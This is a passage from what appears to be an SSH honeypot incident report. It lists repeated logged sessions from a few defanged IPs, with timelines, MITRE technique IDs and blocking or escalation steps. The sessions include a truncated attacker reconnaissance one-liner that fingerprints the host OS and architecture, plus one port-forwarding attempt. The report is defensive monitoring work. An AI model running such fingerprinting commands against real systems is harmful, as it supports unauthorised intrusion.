| `2026-07-11 12:17:48` | `cowrie.command.input` |
| `2026-07-11 12:17:48` | `cowrie.command.success` |
| `2026-07-11 12:17:48` | `cowrie.command.input` |
| `2026-07-11 12:17:48` | `cowrie.command.input` |
| `2026-07-11 12:17:48` | `cowrie.command.input` |
| `2026-07-11 12:17:48` | `cowrie.command.input` |
| `2026-07-11 12:17:49` | `cowrie.log.closed` |
| `2026-07-11 12:17:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f28206a16e06

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 12:18 |
| **Last Seen** | 2026-07-11 12:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:18:14` | `cowrie.session.connect` |
| `2026-07-11 12:18:14` | `cowrie.client.version` |
| `2026-07-11 12:18:14` | `cowrie.client.kex` |
| `2026-07-11 12:18:15` | `cowrie.login.success` |
| `2026-07-11 12:18:16` | `cowrie.session.params` |
| `2026-07-11 12:18:16` | `cowrie.command.input` |
| `2026-07-11 12:18:16` | `cowrie.command.input` |
| `2026-07-11 12:18:16` | `cowrie.command.input` |
| `2026-07-11 12:18:16` | `cowrie.command.input` |
| `2026-07-11 12:18:16` | `cowrie.command.input` |
| `2026-07-11 12:18:16` | `cowrie.command.success` |
| `2026-07-11 12:18:16` | `cowrie.command.input` |
| `2026-07-11 12:18:16` | `cowrie.command.input` |
| `2026-07-11 12:18:16` | `cowrie.command.input` |
| `2026-07-11 12:18:16` | `cowrie.command.input` |
| `2026-07-11 12:18:16` | `cowrie.log.closed` |
| `2026-07-11 12:18:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec27abd749ea

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 12:18 |
| **Last Seen** | 2026-07-11 12:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:18:48` | `cowrie.session.connect` |
| `2026-07-11 12:18:48` | `cowrie.client.version` |
| `2026-07-11 12:18:48` | `cowrie.client.kex` |
| `2026-07-11 12:18:48` | `cowrie.login.success` |
| `2026-07-11 12:18:49` | `cowrie.session.params` |
| `2026-07-11 12:18:49` | `cowrie.command.input` |
| `2026-07-11 12:18:49` | `cowrie.log.closed` |
| `2026-07-11 12:18:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c60f88c55a4a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 12:19 |
| **Last Seen** | 2026-07-11 12:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:19:27` | `cowrie.session.connect` |
| `2026-07-11 12:19:28` | `cowrie.client.version` |
| `2026-07-11 12:19:28` | `cowrie.client.kex` |
| `2026-07-11 12:19:29` | `cowrie.login.success` |
| `2026-07-11 12:19:31` | `cowrie.session.params` |
| `2026-07-11 12:19:31` | `cowrie.command.input` |
| `2026-07-11 12:19:31` | `cowrie.command.input` |
| `2026-07-11 12:19:31` | `cowrie.command.input` |
| `2026-07-11 12:19:31` | `cowrie.command.input` |
| `2026-07-11 12:19:31` | `cowrie.command.input` |
| `2026-07-11 12:19:31` | `cowrie.command.success` |
| `2026-07-11 12:19:31` | `cowrie.command.input` |
| `2026-07-11 12:19:31` | `cowrie.command.input` |
| `2026-07-11 12:19:31` | `cowrie.command.input` |
| `2026-07-11 12:19:31` | `cowrie.command.input` |
| `2026-07-11 12:19:32` | `cowrie.log.closed` |
| `2026-07-11 12:19:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfb7ca40f5f2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 12:20 |
| **Last Seen** | 2026-07-11 12:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:20:05` | `cowrie.session.connect` |
| `2026-07-11 12:20:06` | `cowrie.client.version` |
| `2026-07-11 12:20:06` | `cowrie.client.kex` |
| `2026-07-11 12:20:07` | `cowrie.login.success` |
| `2026-07-11 12:20:08` | `cowrie.session.params` |
| `2026-07-11 12:20:08` | `cowrie.command.input` |
| `2026-07-11 12:20:08` | `cowrie.command.input` |
| `2026-07-11 12:20:08` | `cowrie.command.input` |
| `2026-07-11 12:20:08` | `cowrie.command.input` |
| `2026-07-11 12:20:08` | `cowrie.command.input` |
| `2026-07-11 12:20:08` | `cowrie.command.success` |
| `2026-07-11 12:20:08` | `cowrie.command.input` |
| `2026-07-11 12:20:08` | `cowrie.command.input` |
| `2026-07-11 12:20:08` | `cowrie.command.input` |
| `2026-07-11 12:20:08` | `cowrie.command.input` |
| `2026-07-11 12:20:08` | `cowrie.log.closed` |
| `2026-07-11 12:20:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3686a0fc2e6b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 12:21 |
| **Last Seen** | 2026-07-11 12:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:21:10` | `cowrie.session.connect` |
| `2026-07-11 12:21:10` | `cowrie.client.version` |
| `2026-07-11 12:21:10` | `cowrie.client.kex` |
| `2026-07-11 12:21:13` | `cowrie.login.success` |
| `2026-07-11 12:21:14` | `cowrie.session.params` |
| `2026-07-11 12:21:14` | `cowrie.command.input` |
| `2026-07-11 12:21:14` | `cowrie.command.input` |
| `2026-07-11 12:21:14` | `cowrie.command.input` |
| `2026-07-11 12:21:14` | `cowrie.command.input` |
| `2026-07-11 12:21:14` | `cowrie.command.input` |
| `2026-07-11 12:21:14` | `cowrie.command.success` |
| `2026-07-11 12:21:14` | `cowrie.command.input` |
| `2026-07-11 12:21:14` | `cowrie.command.input` |
| `2026-07-11 12:21:14` | `cowrie.command.input` |
| `2026-07-11 12:21:14` | `cowrie.command.input` |
| `2026-07-11 12:21:15` | `cowrie.log.closed` |
| `2026-07-11 12:21:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6353240419c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 12:21 |
| **Last Seen** | 2026-07-11 12:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:21:55` | `cowrie.session.connect` |
| `2026-07-11 12:21:56` | `cowrie.client.version` |
| `2026-07-11 12:21:56` | `cowrie.client.kex` |
| `2026-07-11 12:21:56` | `cowrie.login.success` |
| `2026-07-11 12:21:57` | `cowrie.session.params` |
| `2026-07-11 12:21:57` | `cowrie.command.input` |
| `2026-07-11 12:21:57` | `cowrie.command.input` |
| `2026-07-11 12:21:57` | `cowrie.command.input` |
| `2026-07-11 12:21:57` | `cowrie.command.input` |
| `2026-07-11 12:21:57` | `cowrie.command.input` |
| `2026-07-11 12:21:57` | `cowrie.command.success` |
| `2026-07-11 12:21:57` | `cowrie.command.input` |
| `2026-07-11 12:21:57` | `cowrie.command.input` |
| `2026-07-11 12:21:57` | `cowrie.command.input` |
| `2026-07-11 12:21:57` | `cowrie.command.input` |
| `2026-07-11 12:21:57` | `cowrie.log.closed` |
| `2026-07-11 12:21:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c90a6f94abb4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 12:22 |
| **Last Seen** | 2026-07-11 12:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:22:54` | `cowrie.session.connect` |
| `2026-07-11 12:22:54` | `cowrie.client.version` |
| `2026-07-11 12:22:54` | `cowrie.client.kex` |
| `2026-07-11 12:22:55` | `cowrie.login.success` |
| `2026-07-11 12:22:57` | `cowrie.session.params` |
| `2026-07-11 12:22:57` | `cowrie.command.input` |
| `2026-07-11 12:22:57` | `cowrie.command.input` |
| `2026-07-11 12:22:57` | `cowrie.command.input` |
| `2026-07-11 12:22:57` | `cowrie.command.input` |
| `2026-07-11 12:22:57` | `cowrie.command.input` |
| `2026-07-11 12:22:57` | `cowrie.command.success` |
| `2026-07-11 12:22:57` | `cowrie.command.input` |
| `2026-07-11 12:22:57` | `cowrie.command.input` |
| `2026-07-11 12:22:57` | `cowrie.command.input` |
| `2026-07-11 12:22:57` | `cowrie.command.input` |
| `2026-07-11 12:22:57` | `cowrie.log.closed` |
| `2026-07-11 12:22:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f91f01985fa5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 12:23 |
| **Last Seen** | 2026-07-11 12:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:23:40` | `cowrie.session.connect` |
| `2026-07-11 12:23:41` | `cowrie.client.version` |
| `2026-07-11 12:23:41` | `cowrie.client.kex` |
| `2026-07-11 12:23:41` | `cowrie.login.success` |
| `2026-07-11 12:23:42` | `cowrie.session.params` |
| `2026-07-11 12:23:42` | `cowrie.command.input` |
| `2026-07-11 12:23:42` | `cowrie.command.input` |
| `2026-07-11 12:23:42` | `cowrie.command.input` |
| `2026-07-11 12:23:42` | `cowrie.command.input` |
| `2026-07-11 12:23:42` | `cowrie.command.input` |
| `2026-07-11 12:23:42` | `cowrie.command.success` |
| `2026-07-11 12:23:42` | `cowrie.command.input` |
| `2026-07-11 12:23:42` | `cowrie.command.input` |
| `2026-07-11 12:23:42` | `cowrie.command.input` |
| `2026-07-11 12:23:42` | `cowrie.command.input` |
| `2026-07-11 12:23:43` | `cowrie.log.closed` |
| `2026-07-11 12:23:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-284ddc91c9f9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 12:24 |
| **Last Seen** | 2026-07-11 12:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:24:39` | `cowrie.session.connect` |
| `2026-07-11 12:24:40` | `cowrie.client.version` |
| `2026-07-11 12:24:40` | `cowrie.client.kex` |
| `2026-07-11 12:24:42` | `cowrie.login.success` |
| `2026-07-11 12:24:43` | `cowrie.session.params` |
| `2026-07-11 12:24:43` | `cowrie.command.input` |
| `2026-07-11 12:24:43` | `cowrie.command.input` |
| `2026-07-11 12:24:43` | `cowrie.command.input` |
| `2026-07-11 12:24:43` | `cowrie.command.input` |
| `2026-07-11 12:24:43` | `cowrie.command.input` |
| `2026-07-11 12:24:43` | `cowrie.command.success` |
| `2026-07-11 12:24:43` | `cowrie.command.input` |
| `2026-07-11 12:24:43` | `cowrie.command.input` |
| `2026-07-11 12:24:43` | `cowrie.command.input` |
| `2026-07-11 12:24:43` | `cowrie.command.input` |
| `2026-07-11 12:24:43` | `cowrie.log.closed` |
| `2026-07-11 12:24:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3b868db39b0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 12:25 |
| **Last Seen** | 2026-07-11 12:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:25:22` | `cowrie.session.connect` |
| `2026-07-11 12:25:22` | `cowrie.client.version` |
| `2026-07-11 12:25:22` | `cowrie.client.kex` |
| `2026-07-11 12:25:23` | `cowrie.login.success` |
| `2026-07-11 12:25:25` | `cowrie.session.params` |
| `2026-07-11 12:25:25` | `cowrie.command.input` |
| `2026-07-11 12:25:25` | `cowrie.command.input` |
| `2026-07-11 12:25:25` | `cowrie.command.input` |
| `2026-07-11 12:25:25` | `cowrie.command.input` |
| `2026-07-11 12:25:25` | `cowrie.command.input` |
| `2026-07-11 12:25:25` | `cowrie.command.success` |
| `2026-07-11 12:25:25` | `cowrie.command.input` |
| `2026-07-11 12:25:25` | `cowrie.command.input` |
| `2026-07-11 12:25:25` | `cowrie.command.input` |
| `2026-07-11 12:25:25` | `cowrie.command.input` |
| `2026-07-11 12:25:25` | `cowrie.log.closed` |
| `2026-07-11 12:25:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42fb32390cda

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 12:26 |
| **Last Seen** | 2026-07-11 12:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:26:29` | `cowrie.session.connect` |
| `2026-07-11 12:26:30` | `cowrie.client.version` |
| `2026-07-11 12:26:30` | `cowrie.client.kex` |
| `2026-07-11 12:26:31` | `cowrie.login.success` |
| `2026-07-11 12:26:32` | `cowrie.session.params` |
| `2026-07-11 12:26:32` | `cowrie.command.input` |
| `2026-07-11 12:26:32` | `cowrie.command.input` |
| `2026-07-11 12:26:32` | `cowrie.command.input` |
| `2026-07-11 12:26:32` | `cowrie.command.input` |
| `2026-07-11 12:26:32` | `cowrie.command.input` |
| `2026-07-11 12:26:32` | `cowrie.command.success` |
| `2026-07-11 12:26:32` | `cowrie.command.input` |
| `2026-07-11 12:26:32` | `cowrie.command.input` |
| `2026-07-11 12:26:32` | `cowrie.command.input` |
| `2026-07-11 12:26:32` | `cowrie.command.input` |
| `2026-07-11 12:26:32` | `cowrie.log.closed` |
| `2026-07-11 12:26:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-310aa73bb04d

| Field | Detail |
|---|---|
| **Source IP** | `117.39.63[.]46` |
| **First Seen** | 2026-07-11 12:26 |
| **Last Seen** | 2026-07-11 12:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:26:51` | `cowrie.session.connect` |
| `2026-07-11 12:26:53` | `cowrie.client.version` |
| `2026-07-11 12:26:53` | `cowrie.client.kex` |
| `2026-07-11 12:26:55` | `cowrie.login.success` |
| `2026-07-11 12:26:56` | `cowrie.direct-tcpip.request` |
| `2026-07-11 12:27:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.39.63[.]46` to AbuseIPDB if not already reported
- [ ] Block `117.39.63[.]46` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffc88c2161dc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 12:27 |
| **Last Seen** | 2026-07-11 12:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:27:04` | `cowrie.session.connect` |
| `2026-07-11 12:27:04` | `cowrie.client.version` |
| `2026-07-11 12:27:04` | `cowrie.client.kex` |
| `2026-07-11 12:27:05` | `cowrie.login.success` |
| `2026-07-11 12:27:06` | `cowrie.session.params` |
| `2026-07-11 12:27:06` | `cowrie.command.input` |
| `2026-07-11 12:27:06` | `cowrie.command.input` |
| `2026-07-11 12:27:06` | `cowrie.command.input` |
| `2026-07-11 12:27:06` | `cowrie.command.input` |
| `2026-07-11 12:27:06` | `cowrie.command.input` |
| `2026-07-11 12:27:06` | `cowrie.command.success` |
| `2026-07-11 12:27:06` | `cowrie.command.input` |
| `2026-07-11 12:27:06` | `cowrie.command.input` |
| `2026-07-11 12:27:06` | `cowrie.command.input` |
| `2026-07-11 12:27:06` | `cowrie.command.input` |
| `2026-07-11 12:27:06` | `cowrie.log.closed` |
